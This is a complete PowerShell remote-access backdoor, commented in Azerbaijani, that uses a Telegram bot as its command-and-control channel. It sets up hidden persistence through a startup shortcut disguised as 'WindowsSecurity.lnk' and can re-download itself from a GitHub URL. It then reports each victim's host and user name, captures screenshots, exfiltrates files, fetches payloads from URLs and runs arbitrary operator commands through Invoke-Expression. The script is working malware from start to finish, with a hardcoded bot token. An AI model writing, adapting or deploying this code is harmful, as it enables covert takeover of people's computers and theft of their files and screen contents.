$token = "8817701294:AAGtc6EO7ln-vZ88RsH_IC76z5N5nmOzQLc"
$chatId = "7432282760"
$apiUrl = "https://api.telegram.org/bot$token"

$lastUpdateId = 0
$currentDir = "C:\"

# --- Avtomatik persistence (yalnız ilk dəfə) ---
$hiddenDir = "$env:APPDATA\Microsoft\Windows\Caches"
if (-not (Test-Path $hiddenDir)) { New-Item -ItemType Directory -Path $hiddenDir -Force | Out-Null }
$hiddenScript = "$hiddenDir\c2.ps1"

if (-not (Test-Path $hiddenScript)) {
    $selfPath = $PSCommandPath
    if (-not $selfPath) { $selfPath = $MyInvocation.MyCommand.Path }
    if (-not $selfPath) { $selfPath = $MyInvocation.MyCommand.Definition }
    
    if ($selfPath -and (Test-Path $selfPath)) {
        Copy-Item -Path $selfPath -Destination $hiddenScript -Force -ErrorAction SilentlyContinue
    } else {
        $selfUrl = "https://raw.githubusercontent.com/USERNAME/badusb-demo/main/step1.ps1"
        try {
            Invoke-WebRequest -Uri $selfUrl -OutFile $hiddenScript -UseBasicParsing -TimeoutSec 30 -ErrorAction Stop
        } catch {}
    }
}

$startupFolder = [Environment]::GetFolderPath('Startup')
$shortcutPath = Join-Path $startupFolder "WindowsSecurity.lnk"
if (-not (Test-Path $shortcutPath) -and (Test-Path $hiddenScript)) {
    try {
        $wshell = New-Object -ComObject WScript.Shell
        $shortcut = $wshell.CreateShortcut($shortcutPath)
        $shortcut.TargetPath = "powershell.exe"
        $shortcut.Arguments = "-W Hidden -NoP -Exec Bypass -File `"$hiddenScript`""
        $shortcut.WindowStyle = 7
        $shortcut.Save()
    } catch {}
}

# --- Köməkçi: mesaj göndər ---
function Send-Message($text) {
    if ($text.Length -gt 4000) { $text = $text.Substring(0, 4000) + "... (kəsildi)" }
    try { Invoke-RestMethod -Uri "$apiUrl/sendMessage" -Method Post -Body @{chat_id=$chatId; text=$text} -TimeoutSec 10 -ErrorAction Stop | Out-Null } catch {}
}

# --- Köməkçi: fayl göndər ---
function Send-File($filePath) {
    if (-not (Test-Path $filePath)) { Send-Message "Xəta: Fayl tapılmadı — $filePath"; return }
    try {
        Add-Type -AssemblyName System.Net.Http
        [byte[]]$fileBytes = [System.IO.File]::ReadAllBytes($filePath)
        $fileName = [System.IO.Path]::GetFileName($filePath)
        $client = [System.Net.Http.HttpClient]::new()
        $client.Timeout = [TimeSpan]::FromSeconds(120)
        $content = [System.Net.Http.MultipartFormDataContent]::new()
        $content.Add([System.Net.Http.StringContent]::new("$chatId"), "chat_id")
        $fileContent = [System.Net.Http.ByteArrayContent]::new($fileBytes)
        $fileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse("application/octet-stream")
        $content.Add($fileContent, "document", $fileName)
        $response = $client.PostAsync("$apiUrl/sendDocument", $content).Result
        $client.Dispose(); $content.Dispose()
        if ($response.IsSuccessStatusCode) { Send-Message "✅ Fayl göndərildi: $fileName" }
        else { Send-Message "Xəta: HTTP $($response.StatusCode)" }
    } catch { Send-Message "Xəta: $_" }
}

# --- Köməkçi: ekran şəkli ---
function Send-Screenshot {
    try {
        Add-Type -AssemblyName System.Windows.Forms
        Add-Type -AssemblyName System.Drawing
        Add-Type -AssemblyName System.Net.Http
        $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
        $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
        $graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)
        $graphics.Dispose()
        $ms = New-Object System.IO.MemoryStream
        $bitmap.Save($ms, [System.Drawing.Imaging.ImageFormat]::Png)
        $bitmap.Dispose()
        [byte[]]$fileBytes = $ms.ToArray()
        $ms.Dispose()
        $client = [System.Net.Http.HttpClient]::new()
        $client.Timeout = [TimeSpan]::FromSeconds(60)
        $content = [System.Net.Http.MultipartFormDataContent]::new()
        $content.Add([System.Net.Http.StringContent]::new("$chatId"), "chat_id")
        $fileContent = [System.Net.Http.ByteArrayContent]::new($fileBytes)
        $fileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse("image/png")
        $content.Add($fileContent, "photo", "ss_$(Get-Date -Format 'yyyyMMdd_HHmmss').png")
        $response = $client.PostAsync("$apiUrl/sendPhoto", $content).Result
        $client.Dispose(); $content.Dispose()
        if ($response.IsSuccessStatusCode) { Send-Message "✅ Ekran şəkli göndərildi" }
        else { Send-Message "Xəta: HTTP $($response.StatusCode)" }
    } catch { Send-Message "Xəta: $_" }
}

# --- Başlanğıc mesajı ---
Send-Message "🟢 C2 başladı: $env:COMPUTERNAME ($env:USERNAME) — $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"

# --- Əsas dövrə ---
while ($true) {
    try {
        $updates = Invoke-RestMethod -Uri "$apiUrl/getUpdates?offset=$($lastUpdateId + 1)&timeout=30" -Method Get -TimeoutSec 40 -ErrorAction Stop
        if ($updates.ok -and $updates.result.Count -gt 0) {
            foreach ($update in $updates.result) {
                $lastUpdateId = $update.update_id
                if ("$($update.message.chat.id)" -eq "$chatId") {
                    $command = $update.message.text
                    if ([string]::IsNullOrWhiteSpace($command)) { continue }
                    $cmd = $command.Trim()

                    if ($cmd -eq "/help" -or $cmd -eq "/start") {
                        Send-Message @"
🤖 Telegram C2 — Əmrlər:
/help — bu mesaj
/ss — ekran şəkli
/file <path> — qovluqdakı faylları siyahıla
/get <path> — faylı göndər
/cd <path> — cari qovluğu dəyiş
/download <url> <path> — URL-dən fayl yüklə
/exit — skripti dayandır və sil
<əmr> — istənilən PowerShell əmri
"@
                        continue
                    }

                    if ($cmd -eq "/ss") { Send-Message "📸 Ekran şəkli çəkilir..."; Send-Screenshot; continue }

                    if ($cmd -like "/file *") {
                        $path = $cmd.Substring(6).Trim()
                        $fullPath = if ([System.IO.Path]::IsPathRooted($path)) { $path } else { Join-Path $currentDir $path }
                        if (Test-Path $fullPath) {
                            $items = Get-ChildItem -Path $fullPath -ErrorAction SilentlyContinue
                            if ($items) {
                                $list = "📁 $fullPath`n`n"
                                foreach ($item in $items) {
                                    $type = if ($item.PSIsContainer) { "📁" } else { "📄" }
                                    $size = if ($item.PSIsContainer) { "" } else { " ($([math]::Round($item.Length/1KB, 2)) KB)" }
                                    $list += "$type $($item.Name)$size`n"
                                }
                                Send-Message $list
                            } else { Send-Message "📁 $fullPath — boşdur" }
                        } else { Send-Message "Xəta: Qovluq tapılmadı" }
                        continue
                    }

                    if ($cmd -like "/get *") {
                        $path = $cmd.Substring(5).Trim()
                        $fullPath = if ([System.IO.Path]::IsPathRooted($path)) { $path } else { Join-Path $currentDir $path }
                        Send-File $fullPath
                        continue
                    }

                    if ($cmd -like "/cd *") {
                        $path = $cmd.Substring(4).Trim()
                        $fullPath = if ([System.IO.Path]::IsPathRooted($path)) { $path } else { Join-Path $currentDir $path }
                        if (Test-Path $fullPath -PathType Container) {
                            $script:currentDir = (Resolve-Path $fullPath).Path
                            $items = Get-ChildItem -Path $currentDir -ErrorAction SilentlyContinue
                            $list = "📂 Cari qovluq: $currentDir`n`n"
                            if ($items) {
                                foreach ($item in $items) {
                                    $type = if ($item.PSIsContainer) { "📁" } else { "📄" }
                                    $size = if ($item.PSIsContainer) { "" } else { " ($([math]::Round($item.Length/1KB, 2)) KB)" }
                                    $list += "$type $($item.Name)$size`n"
                                }
                            } else { $list += "(boşdur)" }
                            Send-Message $list
                        } else { Send-Message "Xəta: Qovluq tapılmadı" }
                        continue
                    }

                    if ($cmd -like "/download *") {
                        $parts = $cmd.Substring(10).Trim() -split '\s+', 2
                        if ($parts.Count -lt 2) { Send-Message "İstifadə: /download <url> <path>"; continue }
                        $url = $parts[0]; $savePath = $parts[1]
                        if ($url -notmatch '^https?://') { Send-Message "Xəta: Yalnız http/https"; continue }
                        $fullPath = if ([System.IO.Path]::IsPathRooted($savePath)) { $savePath } else { Join-Path $currentDir $savePath }
                        try {
                            Invoke-WebRequest -Uri $url -OutFile $fullPath -UseBasicParsing -TimeoutSec 60 -ErrorAction Stop
                            Send-Message "✅ Yükləndi: $fullPath"
                        } catch { Send-Message "Xəta: $_" }
                        continue
                    }

                    if ($cmd -eq "/exit") {
                        Remove-Item $shortcutPath -Force -ErrorAction SilentlyContinue
                        $self = $hiddenScript
                        if (Test-Path $self) {
                            $cleanup = "Start-Sleep -Seconds 3; Remove-Item '$self' -Force -ErrorAction SilentlyContinue"
                            Start-Process powershell -ArgumentList "-W Hidden -NoP -Command `"$cleanup`"" -WindowStyle Hidden
                        }
                        Send-Message "🔴 C2 dayandırılır, startup və skript faylı silinir"
                        exit
                    }

                    try {
                        $output = Invoke-Expression $cmd 2>&1 | Out-String
                        if ([string]::IsNullOrWhiteSpace($output)) { $output = "[Əmr icra olundu, çıxış yoxdur]" }
                    } catch { $output = "Xəta: $_" }
                    Send-Message $output
                }
            }
        }
    } catch { Start-Sleep -Seconds 10 }
    Start-Sleep -Seconds 2
}
